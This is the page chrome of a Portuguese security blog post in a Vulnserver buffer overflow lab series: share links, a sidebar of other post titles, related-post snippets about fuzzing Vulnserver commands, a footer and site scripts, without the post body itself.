H41stur&url=https://h41stur.github.io/posts/std-winbof-6/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão - H41stur&u=https://h41stur.github.io/posts/std-winbof-6/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Windows Vulnserver Buffer Overflow - Parte 6 Badchars e Conclusão - H41stur&url=https://h41stur.github.io/posts/std-winbof-6/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://h41stur.github.io/posts/std-winbof-6/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div><div> <script src="https://utteranc.es/client.js" repo="h41stur/h41stur.github.io" issue-term="url" theme="photon-dark" crossorigin="anonymous" async> </script></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/process-injection/">Process Injection 101</a><li><a href="/posts/evasao-av/">Evasão de Antivírus - Princípios Gerais e Abordagens Específicas</a><li><a href="/posts/paper-heap/">Heap Exploitation P.1</a><li><a href="/posts/shellcoding101/">Shellcoding 101</a><li><a href="/posts/replay-sinal-rf/">Uma Jornada no Hardware Hacking: Criando um Clonador de Sinais RF</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/std-winbof-1/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T12:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 1 Objetivos e Análise do Código</h3><div class="text-muted small"><p> BUFFER OVERFLOW EM WINDOWS Neste laboratório, vamos explorar várias técnicas de buffer overflow no SO Windows, o intuito é de entender a mecânica por trás de aplicações e programas e encontrar uma...</p></div></div></a></div><div class="card"> <a href="/posts/std-winbof-2/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T13:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 2 Simples BOF</h3><div class="text-muted small"><p> COMANDO TRUN O comando TRUN, assim como os demais, recebe um argumento e dá uma resposta. Sabendo de seu funcionamento, precisamos fazer o fuzzing do comando e descobrir se conseguimos causar o...</p></div></div></a></div><div class="card"> <a href="/posts/std-winbof-3/"><div class="card-body"> <span class="timeago small" >Oct 6, 2021<i class="unloaded">2021-10-06T14:00:00-03:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Windows Vulnserver Buffer Overflow - Parte 3 Saltos na Memória</h3><div class="text-muted small"><p> COMANDO GTER O comando GTER, assim como os demais, recebe um argumento e dá uma resposta. Neste comando, temos uma situação parecida com a anterior, porém encontramos uma problema com o espaço dis...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/std-winbof-5/" class="btn btn-outline-primary" prompt="Older"><p>Windows Vulnserver Buffer Overflow - Parte 5 Reuso de Socket</p></a> <a href="/posts/std-dojo-1/" class="btn btn-outline-primary" prompt="Newer"><p>Hacking Dojo - Semana \x01</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/h41stur">H41stur</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
